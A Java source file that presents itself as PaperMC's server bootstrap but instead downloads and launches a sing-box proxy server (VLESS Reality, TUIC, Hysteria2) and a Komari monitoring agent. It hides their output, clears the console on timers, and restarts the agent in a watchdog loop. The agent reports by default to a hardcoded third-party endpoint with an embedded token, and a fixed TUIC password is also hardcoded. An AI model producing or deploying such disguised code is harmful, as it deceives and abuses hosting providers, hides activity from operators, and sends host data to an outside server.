package io.papermc.paper;

import org.yaml.snakeyaml.Yaml;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.*;
import java.util.Locale;

public class PaperBootstrap {
    // ========== 全局变量（托管 Komari 子进程）==========
    private static final Path UUID_FILE = Paths.get("data/uuid.txt");
    private static String uuid;
    private static final AtomicBoolean running = new AtomicBoolean(true);
    // 核心：用Process对象托管Komari（父子进程绑定，隐藏在jar中）
    private static Process komariProcess;
    private static Process singboxProcess;
    // ==================================================

    public static void main(String[] args) {
        try {
            // 关闭钩子：仅终止子进程，不触发额外信号
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                if (komariProcess != null && komariProcess.isAlive()) komariProcess.destroy();
                if (singboxProcess != null && singboxProcess.isAlive()) singboxProcess.destroy();
            }));

            System.out.println("config.yml 加载中...");
            Map<String, Object> config = loadConfig();

            // ---------- UUID 处理 ----------
            uuid = generateOrLoadUUID(config.get("uuid"));
            System.out.println("当前使用的 UUID: " + uuid);

            // ===== sing-box 配置 & 启动（嵌入jar进程）=====
            String tuicPort = trim((String) config.get("tuic_port"));
            String hy2Port = trim((String) config.get("hy2_port"));
            String realityPort = trim((String) config.get("reality_port"));
            String sni = (String) config.getOrDefault("sni", "www.bing.com");

            boolean deployVLESS = !realityPort.isEmpty();
            boolean deployTUIC = !tuicPort.isEmpty();
            boolean deployHY2 = !hy2Port.isEmpty();

            if (!deployVLESS && !deployTUIC && !deployHY2)
                throw new RuntimeException("❌ 未设置任何协议端口！");

            Path baseDir = Paths.get("/tmp/.singbox");
            Files.createDirectories(baseDir);
            Path configJson = baseDir.resolve("config.json");
            Path cert = baseDir.resolve("cert.pem");
            Path key = baseDir.resolve("private.key");
            Path bin = baseDir.resolve("sing-box");
            Path realityKeyFile = Paths.get("reality.key");

            System.out.println("✅ config.yml 加载成功");

            // 生成证书/密钥/配置
            generateSelfSignedCert(cert, key);
            String version = fetchLatestSingBoxVersion();
            safeDownloadSingBox(version, bin, baseDir);
            String privateKey = "", publicKey = "";
            if (deployVLESS) {
                if (Files.exists(realityKeyFile)) {
                    List<String> lines = Files.readAllLines(realityKeyFile);
                    for (String line : lines) {
                        if (line.startsWith("PrivateKey:")) privateKey = line.split(":", 2)[1].trim();
                        if (line.startsWith("PublicKey:")) publicKey = line.split(":", 2)[1].trim();
                    }
                    System.out.println("🔑 已加载本地 Reality 密钥对");
                } else {
                    Map<String, String> keys = generateRealityKeypair(bin);
                    privateKey = keys.get("private_key");
                    publicKey = keys.get("public_key");
                    Files.writeString(realityKeyFile, "PrivateKey: " + privateKey + "\nPublicKey: " + publicKey);
                    System.out.println("✅ Reality 密钥已保存");
                }
            }
            generateSingBoxConfig(configJson, uuid, deployVLESS, deployTUIC, deployHY2,
                    tuicPort, hy2Port, realityPort, sni, cert, key, privateKey, publicKey);

            // 启动sing-box（作为Java子进程，嵌入jar）
            startSingBoxAsChildProcess(bin, configJson);
            // 3分钟后极简清屏（仅输出指定提示）
            scheduleClearConsoleAfter3Minutes();

            // ===== Komari Agent 启动（嵌入jar进程，核心修改）=====
            runKomariAsChildProcess(config);
            // 启动Komari守护线程（基于Process对象检测，无PID文件）
            startKomariDaemonThread(config);

            // ===== 输出节点 =====
            String host = detectPublicIP();
            printDeployedLinks(uuid, deployVLESS, deployTUIC, deployHY2,
                    tuicPort, hy2Port, realityPort, sni, host, publicKey);

            // 节点输出后30秒极简清屏
            scheduleConsoleClear(30);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== 核心1：Komari 作为Java子进程启动（嵌入jar）==========
    private static void runKomariAsChildProcess(Map<String, Object> config) throws Exception {
        // 读取Komari配置
        String komariE = trim((String) config.getOrDefault("komari_e", "https://vps.z1000.dpdns.org:10736"));
        String komariT = trim((String) config.getOrDefault("komari_t", "vwSidaxzgBHpzsKEiJytba"));
        String komariUrlAmd64 = trim((String) config.getOrDefault("komari_amd64_url",
                "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-amd64"));
        String komariUrlArm64 = trim((String) config.getOrDefault("komari_arm64_url",
                "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64"));
        String komariFileName = trim((String) config.getOrDefault("komari_file_name", "sbx_komari"));

        // 下载Komari二进制文件
        Path agentPath = getKomariAgentPath(komariUrlAmd64, komariUrlArm64, komariFileName);

        // 核心：直接启动为Java子进程（不脱离、不用nohup/setsid）
        ProcessBuilder pb = new ProcessBuilder(
                agentPath.toString(),
                "-e", komariE,
                "-t", komariT
        );
        // 重定向IO到null（隐藏日志，不干扰主进程）
        pb.redirectOutput(ProcessBuilder.Redirect.to(new File("/dev/null")));
        pb.redirectError(ProcessBuilder.Redirect.to(new File("/dev/null")));
        pb.redirectInput(ProcessBuilder.Redirect.from(new File("/dev/null")));
        // 移除错误的 pb.inheritIO(false); —— 该方法无参，无需调用

        // 启动并保存Process对象（核心：托管在jar中）
        komariProcess = pb.start();
        System.out.println("\n✅ Komari Agent 启动成功（嵌入jar进程，配置：e=" + komariE + ", t=" + komariT + "）");
    }

    // ========== 核心2：Sing-box 作为Java子进程启动（嵌入jar）==========
    private static void startSingBoxAsChildProcess(Path bin, Path cfg) throws IOException, InterruptedException {
        System.out.println("正在启动 sing-box（嵌入jar进程）...");
        // 直接启动为Java子进程
        ProcessBuilder pb = new ProcessBuilder(
                bin.toString(),
                "run",
                "-c", cfg.toString()
        );
        // 重定向IO到null
        pb.redirectOutput(ProcessBuilder.Redirect.to(new File("/dev/null")));
        pb.redirectError(ProcessBuilder.Redirect.to(new File("/dev/null")));
        pb.redirectInput(ProcessBuilder.Redirect.from(new File("/dev/null")));
        // 移除错误的 pb.inheritIO(false); —— 该方法无参，无需调用

        // 启动并保存Process对象
        singboxProcess = pb.start();
        Thread.sleep(1500);
        System.out.println("sing-box 已启动（嵌入jar进程，PID: " + singboxProcess.pid() + "）");
    }

    // ========== 核心3：Komari守护线程（基于Process对象检测）==========
    private static void startKomariDaemonThread(Map<String, Object> config) {
        Thread daemonThread = new Thread(() -> {
            // 优化：启动缓冲3秒，避免进程未完全启动就检测
            try { Thread.sleep(3000); } catch (Exception e) {}

            while (running.get()) {
                try {
                    // 直接检测Process对象状态（最可靠，无容器干扰）
                    boolean isAlive = (komariProcess != null && komariProcess.isAlive());
                    if (!isAlive) {
                        System.err.println("\n❌ Komari Agent 子进程退出，重新启动...");
                        // 销毁旧进程，重启新子进程
                        if (komariProcess != null) komariProcess.destroy();
                        runKomariAsChildProcess(config);
                    }
                    // 优化：检测间隔改为10秒，减少频繁检测
                    Thread.sleep(10000);
                } catch (Exception e) {
                    System.err.println("❌ Komari 检测/重启失败：" + e.getMessage());
                }
            }
        });
        daemonThread.setDaemon(true);
        daemonThread.setName("KomariDaemon");
        daemonThread.start();
        System.out.println("✅ Komari Agent 守护线程启动（基于子进程检测）");
    }

    // ========== 极简清屏（仅输出指定提示）==========
    private static void clearConsole() {
        try {
            String osName = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
            ProcessBuilder pb = osName.contains("win") 
                ? new ProcessBuilder("cmd", "/c", "cls") 
                : new ProcessBuilder("sh", "-c", "clear");
            pb.redirectOutput(ProcessBuilder.Redirect.PIPE);
            pb.redirectError(ProcessBuilder.Redirect.PIPE);
            pb.redirectInput(ProcessBuilder.Redirect.PIPE);
            pb.start();
        } catch (Exception e) {}
        // 仅输出指定提示，无任何额外内容
        System.out.println("✅ 控制台日志已清空（服务运行不受影响）");
    }

    // ========== 延迟清屏工具方法 ==========
    private static void scheduleConsoleClear(int delaySeconds) {
        ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.schedule(() -> {
            clearConsole();
            scheduler.shutdown();
        }, delaySeconds, TimeUnit.SECONDS);
    }

    private static void scheduleClearConsoleAfter3Minutes() {
        ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.schedule(() -> {
            clearConsole();
            scheduler.shutdown();
        }, 180, TimeUnit.SECONDS);
        System.out.println("[定时清屏] 已计划服务启动3分钟后清空控制台日志");
    }

    // ========== 原有工具方法（保留，无修改）==========
    private static String generateOrLoadUUID(Object configUuid) {
        String cfg = trim((String) configUuid);
        if (!cfg.isEmpty()) {
            saveUuidToFile(cfg);
            return cfg;
        }
        try {
            if (Files.exists(UUID_FILE)) {
                String saved = Files.readString(UUID_FILE).trim();
                if (isValidUUID(saved)) {
                    System.out.println("已加载持久化 UUID: " + saved);
                    return saved;
                }
            }
        } catch (Exception e) {
            System.err.println("读取 UUID 文件失败: " + e.getMessage());
        }
        String newUuid = UUID.randomUUID().toString();
        saveUuidToFile(newUuid);
        System.out.println("首次生成 UUID: " + newUuid);
        return newUuid;
    }

    private static void saveUuidToFile(String uuid) {
        try {
            Files.createDirectories(UUID_FILE.getParent());
            Files.writeString(UUID_FILE, uuid);
            UUID_FILE.toFile().setReadable(false, false);
            UUID_FILE.toFile().setReadable(true, true);
        } catch (Exception e) {
            System.err.println("保存 UUID 失败: " + e.getMessage());
        }
    }

    private static boolean isValidUUID(String u) {
        return u != null && u.matches("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$");
    }

    private static String trim(String s) {
        return s == null ? "" : s.trim();
    }

    private static Map<String, Object> loadConfig() throws IOException {
        Yaml yaml = new Yaml();
        Path configPath = Paths.get("config.yml");
        if (!Files.exists(configPath)) {
            Files.createFile(configPath);
            System.out.println("⚠️ config.yml 不存在，已创建空文件");
            return new HashMap<>();
        }
        try (InputStream in = Files.newInputStream(configPath)) {
            Object o = yaml.load(in);
            return o instanceof Map ? (Map<String, Object>) o : new HashMap<>();
        }
    }

    private static void generateSelfSignedCert(Path cert, Path key) throws IOException, InterruptedException {
        if (Files.exists(cert) && Files.exists(key)) {
            System.out.println("🔑 证书已存在，跳过生成");
            return;
        }
        System.out.println("🔨 生成 EC 自签证书...");
        new ProcessBuilder("bash", "-c",
                "openssl ecparam -genkey -name prime256v1 -out " + key + " && " +
                        "openssl req -new -x509 -days 3650 -key " + key + " -out " + cert + " -subj '/CN=bing.com'")
                .inheritIO().start().waitFor();
        System.out.println("✅ 证书生成完成");
    }

    private static Map<String, String> generateRealityKeypair(Path bin) throws IOException, InterruptedException {
        System.out.println("🔑 生成 Reality 密钥对...");
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", bin + " generate reality-keypair");
        pb.redirectErrorStream(true);
        Process p = pb.start();
        StringBuilder sb = new StringBuilder();
        try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
        }
        p.waitFor();
        String out = sb.toString();
        Matcher priv = Pattern.compile("PrivateKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        Matcher pub = Pattern.compile("PublicKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        if (!priv.find() || !pub.find()) throw new IOException("Reality 密钥生成失败");
        Map<String, String> map = new HashMap<>();
        map.put("private_key", priv.group(1));
        map.put("public_key", pub.group(1));
        System.out.println("✅ Reality 密钥生成完成");
        return map;
    }

    private static void generateSingBoxConfig(Path configFile, String uuid, boolean vless, boolean tuic, boolean hy2,
                                              String tuicPort, String hy2Port, String realityPort,
                                              String sni, Path cert, Path key,
                                              String privateKey, String publicKey) throws IOException {

        List<String> inbounds = new ArrayList<>();
        if (tuic) {
            inbounds.add("""
              {
                "type": "tuic",
                "listen": "::",
                "listen_port": %s,
                "users": [{"uuid": "%s", "password": "eishare2025"}],
                "congestion_control": "bbr",
                "tls": {
                  "enabled": true,
                  "alpn": ["h3"],
                  "certificate_path": "%s",
                  "key_path": "%s"
                }
              }
            """.formatted(tuicPort, uuid, cert, key));
        }
        if (hy2) {
            inbounds.add("""
              {
                "type": "hysteria2",
                "listen": "::",
                "listen_port": %s,
                "users": [{"password": "%s"}],
                "masquerade": "https://bing.com",
                "ignore_client_bandwidth": true,
                "up_mbps": 1000,
                "down_mbps": 1000,
                "tls": {
                  "enabled": true,
                  "alpn": ["h3"],
                  "insecure": true,
                  "certificate_path": "%s",
                  "key_path": "%s"
                }
              }
            """.formatted(hy2Port, uuid, cert, key));
        }
        if (vless) {
            inbounds.add("""
              {
                "type": "vless",
                "listen": "::",
                "listen_port": %s,
                "users": [{"uuid": "%s", "flow": "xtls-rprx-vision"}],
                "tls": {
                  "enabled": true,
                  "server_name": "%s",
                  "reality": {
                    "enabled": true,
                    "handshake": {"server": "%s", "server_port": 443},
                    "private_key": "%s",
                    "short_id": [""]
                  }
                }
              }
            """.formatted(realityPort, uuid, sni, sni, privateKey));
        }

        String json = """
        {
          "log": { "level": "info" },
          "inbounds": [%s],
          "outbounds": [{"type": "direct"}]
        }
        """.formatted(String.join(",", inbounds));
        Files.writeString(configFile, json);
        System.out.println("✅ sing-box 配置生成完成");
    }

    private static String fetchLatestSingBoxVersion() {
        String fallback = "1.12.12";
        try {
            URL url = new URL("https://api.github.com/repos/SagerNet/sing-box/releases/latest");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("Accept", "application/vnd.github.v3+json");
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String json = br.lines().reduce("", (a, b) -> a + b);
                int i = json.indexOf("\"tag_name\":\"v");
                if (i != -1) {
                    String v = json.substring(i + 13, json.indexOf("\"", i + 13));
                    System.out.println("🔍 sing-box 最新版本: " + v);
                    return v;
                }
            }
        } catch (Exception e) {
            System.out.println("⚠️ 获取 sing-box 版本失败，使用兜底版本: " + fallback);
        }
        return fallback;
    }

    private static void safeDownloadSingBox(String version, Path bin, Path dir) throws IOException, InterruptedException {
        if (Files.exists(bin)) return;
        String arch = detectArch();
        String file = "sing-box-" + version + "-linux-" + arch + ".tar.gz";
        String url = "https://github.com/SagerNet/sing-box/releases/download/v" + version + "/" + file;

        System.out.println("⬇️ 下载 sing-box: " + url);
        Path tar = dir.resolve(file);
        new ProcessBuilder("bash", "-c", "curl -L -o " + tar + " \"" + url + "\"").inheritIO().start().waitFor();
        new ProcessBuilder("bash", "-c",
                "cd " + dir + " && tar -xzf " + file + " 2>/dev/null || true && " +
                        "(find . -type f -name 'sing-box' -exec mv {} ./sing-box \\; ) && chmod +x sing-box || true")
                .inheritIO().start().waitFor();

        if (!Files.exists(bin)) throw new IOException("❌ 未找到 sing-box 可执行文件");
        System.out.println("✅ sing-box 下载解压完成");
    }

    private static String detectArch() {
        String a = System.getProperty("os.arch").toLowerCase();
        return a.contains("aarch") || a.contains("arm") ? "arm64" : "amd64";
    }

    private static Path getKomariAgentPath(String komariUrlAmd64, String komariUrlArm64, String komariFileName) throws IOException {
        String arch = detectArch();
        String url = arch.equals("amd64") ? komariUrlAmd64 : komariUrlArm64;
        Path agentPath = Paths.get(System.getProperty("java.io.tmpdir"), komariFileName);

        if (Files.exists(agentPath)) {
            return agentPath;
        }

        System.out.println("\n⬇️ 下载 Komari Agent: " + url);
        try (InputStream in = new URL(url).openStream()) {
            Files.copy(in, agentPath, StandardCopyOption.REPLACE_EXISTING);
        }

        if (!agentPath.toFile().setExecutable(true)) {
            throw new IOException("❌ 无法设置 Komari Agent 可执行权限");
        }

        System.out.println("✅ Komari Agent 下载授权完成");
        return agentPath;
    }

    private static String detectPublicIP() {
        try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org").openStream()))) {
            return br.readLine();
        } catch (Exception e) {
            return "your-server-ip";
        }
    }

    private static void printDeployedLinks(String uuid, boolean vless, boolean tuic, boolean hy2,
                                           String tuicPort, String hy2Port, String realityPort,
                                           String sni, String host, String publicKey) {
        System.out.println("\n=== ✅ 已部署节点链接 ===");
        if (vless)
            System.out.printf("VLESS Reality:\nvless://%s@%s:%s?encryption=none&flow=xtls-rprx-vision&security=reality&sni=%s&fp=chrome&pbk=%s#Reality\n",
                    uuid, host, realityPort, sni, publicKey);
        if (tuic)
            System.out.printf("\nTUIC:\ntuic://%s:eishare2025@%s:%s?sni=%s&alpn=h3&congestion_control=bbr&allowInsecure=1#TUIC\n",
                    uuid, host, tuicPort, sni);
        if (hy2)
            System.out.printf("\nHysteria2:\nhysteria2://%s@%s:%s?sni=%s&insecure=1#Hysteria2\n",
                    uuid, host, hy2Port, sni);
    }

    private static void deleteDirectory(Path dir) throws IOException {
        if (!Files.exists(dir)) return;
        Files.walk(dir).sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(File::delete);
    }
}
